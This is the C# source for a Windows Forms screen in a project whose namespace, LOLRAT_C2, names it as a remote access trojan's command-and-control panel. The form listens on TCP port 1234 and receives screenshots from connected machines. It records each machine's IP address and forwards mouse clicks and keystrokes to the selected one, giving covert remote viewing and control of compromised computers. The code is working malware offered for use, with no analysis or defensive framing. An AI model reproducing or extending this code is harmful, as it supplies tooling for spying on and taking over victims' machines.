using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace LOLRAT_C2
{
    public partial class SS : Form
    {
        // SS
        private TcpListener serverSS;
        private Image receivedImageSS;
        // Add a reference to the Main class
        private Main mainInstance;
        public string currentViewingIP = "";

        public bool mouseControlEnabled = false;
        public bool keyboardControlEnabled = false;

        public SS(Main mainInstance)
        {
            InitializeComponent();

            // Set PictureBox.SizeMode to Zoom
            pbSS.SizeMode = PictureBoxSizeMode.Zoom;

            // SS stuff
            receivedImageSS = new Bitmap(1, 1);
            pbSS.Image = receivedImageSS;

            // Store the reference to the Main instance
            this.mainInstance = mainInstance;

            // Attach the MouseClick event handler to the PictureBox
            pbSS.MouseClick += PictureBoxMouseClickHandler;

            // Start listening for connections in a separate thread
            Thread listenerThread = new Thread(ListenForConnectionsSS);
            listenerThread.IsBackground = true;
            listenerThread.Start();
        }

        private void PictureBoxMouseClickHandler(object sender, MouseEventArgs e)
        {
            // Check if receivedImageSS is null
            if (receivedImageSS == null)
            {
                MessageBox.Show("Received image is null. Ensure that the image is properly received.");
                return;
            }

            // Calculate coordinates relative to the scaled image
            float imageScaleX = (float)receivedImageSS.Width / pbSS.Width;
            float imageScaleY = (float)receivedImageSS.Height / pbSS.Height;

            // Check if pbSS is null
            if (pbSS == null)
            {
                MessageBox.Show("PictureBox is null. Ensure that it is properly initialized.");
                return;
            }

            // Check if pbSS.Image is null
            if (pbSS.Image == null)
            {
                MessageBox.Show("PictureBox Image is null. Ensure that it is properly set.");
                return;
            }

            int imageX = (int)(e.X * imageScaleX);
            int imageY = (int)(e.Y * imageScaleY);

            // Call the ExecuteMouseClick method on the main instance
            if (mouseControlEnabled)
            {
                mainInstance.ExecuteMouseClick(imageX, imageY, "left", currentViewingIP);
                //MessageBox.Show($"Clicked on image at coordinates X: {imageX}, Y: {imageY}");
            }
        }

        // Add a method that will be called when a key is pressed and log the key
        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            // Convert keyData to string
            string keyDataString = keyData.ToString();

            if (keyboardControlEnabled)
            {
                mainInstance.ExecuteKeyboardClick(keyDataString, currentViewingIP);
                MessageBox.Show($"Pressed key: {keyDataString}");
            }
            return base.ProcessCmdKey(ref msg, keyData); // Call the base method
        }

        // Add a method that will be called when the form exits
        private void SS_FormClosing(object sender, FormClosingEventArgs e)
        {
            StopListening();
        }

        // SS
        private void StopListening()
        {
            if (serverSS != null)
            {
                serverSS.Stop();
            }
        }
        private void ListenForConnectionsSS()
        {
            try
            {
                serverSS = new TcpListener(IPAddress.Any, 1234);
                serverSS.Start();
                Console.WriteLine("Waiting for a connection...");

                while (true)
                {
                    using (TcpClient client = serverSS.AcceptTcpClient())
                    {
                        string clientAddress = ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString();
                        Console.WriteLine("Accepted connection from " + clientAddress);

                        using (NetworkStream stream = client.GetStream())
                        using (BinaryReader reader = new BinaryReader(stream))
                        {
                            int imageSize = Math.Abs(reader.ReadInt32());
                            if (imageSize > 0)
                            {
                                Console.WriteLine("Receiving image of size: " + imageSize);

                                byte[] imageData = reader.ReadBytes(imageSize);
                                using (MemoryStream memoryStream = new MemoryStream(imageData))
                                {
                                    currentViewingIP = clientAddress;
                                    // Add IP to cbSSIPS
                                    cbSSIPS.Invoke((MethodInvoker)delegate
                                    {
                                        // Check if it already exists
                                        if (!cbSSIPS.Items.Contains(clientAddress))
                                        {
                                            cbSSIPS.Items.Add(clientAddress);
                                        }
                                    });

                                    // Apply the image to the receivedImageSS variable (So that it can be used later.)
                                    receivedImageSS = Image.FromStream(memoryStream);

                                    // Check if the current IP is selected in cbSSIPS
                                    if (cbSSIPS.SelectedItem != null && cbSSIPS.SelectedItem.ToString() == clientAddress)
                                    {
                                        // Display the received image in the PictureBox (Invoke on the main thread)
                                        pbSS.Invoke((MethodInvoker)delegate
                                        {
                                            pbSS.Invalidate();
                                            pbSS.Image = receivedImageSS;
                                            pbSS.Invalidate();
                                            pbSS.Refresh();
                                        });
                                    }
                                    else // If the current IP is not selected in cbSSIPS
                                    {
                                        // Display the received image in the PictureBox (Invoke on the main thread)
                                        Console.WriteLine("Received image from " + clientAddress + " but it is not selected in cbSSIPS. Not displaying.");
                                    }
                                }
                            }
                            else
                            {
                                Console.WriteLine("Invalid image size received: " + imageSize);
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }




        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            StopListening();

            base.OnFormClosing(e);
        }

        private void cbMouseControl_CheckedChanged(object sender, EventArgs e)
        {
            if (mouseControlEnabled)
            {
                mouseControlEnabled = false;
            }
            else
            {
                mouseControlEnabled = true;
            }
        }

        private void cbKeyboardControl_CheckedChanged(object sender, EventArgs e)
        {
            if (keyboardControlEnabled)
            {
                keyboardControlEnabled = false;
            }
            else
            {
                keyboardControlEnabled = true;
            }

        }
    }
}
